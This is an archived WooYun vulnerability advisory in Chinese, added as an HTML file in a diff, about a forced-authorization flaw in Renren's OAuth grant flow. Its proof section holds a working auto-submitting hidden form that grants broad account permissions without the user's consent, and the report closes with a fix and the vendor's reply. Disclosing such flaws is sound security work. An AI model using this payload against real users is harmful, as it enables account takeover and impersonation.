@@ -1,0 +1,226 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		人人网开放平台第三方应用oauth强制授权漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		人人网开放平台第三方应用oauth强制授权漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/小点兵">小点兵</a> 
+</li><li>提交时间：		2012-12-05 18:29</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-12-05：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-12-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-12-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-12-26：	细节向普通白帽子公开<br/>
+									2013-01-05：	细节向实习白帽子公开<br/>
+									2013-01-19：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">利用此漏洞，在人人网开放平台注册的第三方应用可以跳过询问用户是否授权的页面，而直接拿到用户的授权。由于跳过了询问用户授权界面，恶意第三方可以直接骗取最高授权，从而可以访问用户敏感信息，访问用户好友信息，冒充用户发布日志，分享等。具体可用非法操作可参见http://wiki.dev.renren.com/wiki/API</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">正常的oauth授权流程应符合如下几个步骤（假设人人网用户已经登录）：<br />
+<br />
+1，在http://app.renren.com/点击应用<br />
+<br />
+2，访问应用网址，比如：http://www.friendoc.net/friendoc/v3.1/ <br />
+<br />
+3, 应用从定向用户到询问是否授权网页，比如 http://graph.renren.com/oauth/grant?client_id=c6e5f5a7b7754fcbb9b1f3ae41d290ee&amp;redirect_uri=http%3A%2F%2Fwww.friendoc.net%2Ffriendoc%2Fv3.1%2Floading.php&amp;response_type=code&amp;display=iframe&amp;scope=read_user_status+create_album+read_user_album+photo_upload+read_user_photo+read_user_blog+read_user_feed+read_user_guestbook+read_user_comment+send_request+publish_comment+publish_checkin&amp;state=200&amp;origin=0 , 询问用户是否授权。此页面详细描述是向什么应用授予什么权限，以帮助用户做出选择<br />
+<br />
+4, 用户点击授权按钮，浏览器向授权服务器http://graph.renren.com/oauth/grant 发送相应的同意授权信息 （POST命令）<br />
+<br />
+5，应用获得授权<br />
+<br />
+<br />
+<br />
+此漏洞在于恶意的应用可以在第2步后直接忽略第3步，而执行第4步，因此在未得到用户同意（用户不知情）的情况下，拿到用户的授权。由于少了第3步的保护，用户会在不知情的情况下授权，攻击者拿到授权后，就可以以用户的名义在天涯微博上发布信息，欺骗用户的朋友以获取利益<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">将下面这段代码加入某个人人网嵌入某个链接，然后再人人网中发布诱骗其他用户点击，则应用“好友档案”将强制被骗用户授予scope=&quot;read_user_status create_album read_user_album photo_upload read_user_photo read_user_blog read_user_feed read_user_guestbook read_user_comment send_request publish_comment publish_checkin&quot;的权限。注意，任何其他应用都可以做类似的事情。攻击者可以随便注册应用，然后构造类似的form去骗取用户的授权。<br />
+<br />
+<br />
+<br />
+人人网支持的API权利还是蛮大的<br />
+<br />
+<br />
+<br />
+&lt;form name=&quot;form1&quot; action=&quot;http://graph.renren.com/oauth/grant&quot; method=&quot;POST&quot;&gt;<br />
+<br />
+&lt;input type=&quot;hidden&quot; name=&quot;follow&quot; value=&quot;true&quot;/&gt;<br />
+<br />
+&lt;input type=&quot;hidden&quot; name=&quot;authFeed&quot; value=&quot;true&quot;/&gt;<br />
+<br />
+&lt;input type=&quot;hidden&quot; name=&quot;porigin&quot; value=&quot;80104&quot;/&gt;<br />
+<br />
+&lt;input type=&quot;hidden&quot; name=&quot;redirect_uri&quot; value=&quot;http://www.friendoc.net/friendoc/v3.1/loading.php&quot;/&gt;<br />
+<br />
+&lt;input type=&quot;hidden&quot; name=&quot;client_id&quot; value=&quot;c6e5f5a7b7754fcbb9b1f3ae41d290ee&quot;/&gt;<br />
+<br />
+&lt;input type=&quot;hidden&quot; name=&quot;response_type&quot; value=&quot;code&quot;/&gt;<br />
+<br />
+&lt;input type=&quot;hidden&quot; name=&quot;scope&quot; value=&quot;read_user_status create_album read_user_album photo_upload read_user_photo read_user_blog read_user_feed read_user_guestbook read_user_comment send_request publish_comment publish_checkin&quot;/&gt;<br />
+<br />
+&lt;input type=&quot;hidden&quot; name=&quot;state&quot; value=&quot;200&quot;/&gt;<br />
+<br />
+&lt;input type=&quot;hidden&quot; name=&quot;display&quot; value=&quot;iframe&quot;/&gt;<br />
+<br />
+&lt;input type=&quot;hidden&quot; name=&quot;post_form_id&quot; value=&quot;abb488287369e5f274a6fcb9f5c6a480-30-1354700245435&quot;/&gt;<br />
+<br />
+&lt;input type=&quot;hidden&quot; name=&quot;authorizeOrigin&quot; value=&quot;0&quot;/&gt;<br />
+<br />
+&lt;/form&gt;<br />
+<br />
+&lt;script type=&quot;text/javascript&quot;&gt;<br />
+<br />
+document.form1.submit();<br />
+<br />
+&lt;/script&gt;<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/05181752492ca5e67ed19bf3b6fd1ae3bc0a24c2.jpg" target="_blank"><img src="../images/05181752492ca5e67ed19bf3b6fd1ae3bc0a24c2.jpg" alt="renren.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">建议在第3步用户访问的页面中加入随机码，在用户提交同意授权的表单中，需要同时提交这个随机码(或者用户cookie)，以保证这个提交表单确实是用户同意的<br />
+<br />
+<br />
+<br />
+后者在第4步提交post时，确认referer选项 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/小点兵" title="小点兵">小点兵</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-015662" title="人人网开放平台第三方应用oauth强制授权漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：1 </p>
+													<p class="detail">确认时间：2012-12-06 12:24</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢对人人网的关注，辛苦了</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="15662";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
